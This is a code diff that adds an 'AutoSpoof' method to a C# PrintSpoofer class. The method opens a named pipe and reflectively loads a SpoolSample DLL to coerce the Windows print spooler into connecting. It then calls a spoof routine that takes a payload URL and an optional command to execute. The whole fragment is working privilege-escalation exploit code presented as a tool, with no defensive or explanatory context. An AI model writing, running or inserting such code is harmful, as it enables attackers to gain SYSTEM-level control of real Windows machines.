@@ -14,6 +14,34 @@ internal static class PrintSpoofer
     const uint DEFAULT_TIMEOUT = 0;
     const uint TOKEN_ALL_ACCESS = 0xF01FF;
 
+    internal static async Task AutoSpoof(
+        string pipeName,
+        string payloadUrl,
+        string executeCmd = null
+    )
+    {
+        var computerName = Environment.MachineName;
+        var pipe = $"\\\\.\\pipe\\{pipeName}\\spoolss";
+        byte[] commandBytes = Encoding.Unicode.GetBytes(
+            $"\\\\{computerName} \\\\{computerName}/pipe/{pipeName}"
+        );
+
+        var tasks = new List<Task>
+        {
+            Task.Run(async () => await Spoof(pipe, payloadUrl, executeCmd)),
+            Task.Run(async () =>
+            {
+                await Task.Delay(1000);
+                SpoolSample.RDILoader.CallExportedFunction(
+                    SpoolSample.Data.RprnDll,
+                    "DoStuff",
+                    commandBytes
+                );
+            })
+        };
+        await Task.WhenAll(tasks);
+    }
+
     internal static async Task Spoof(string pipeName, string payloadUrl, string executeCmd = null)
     {
         var pipe = Lib.CreateNamedPipe(
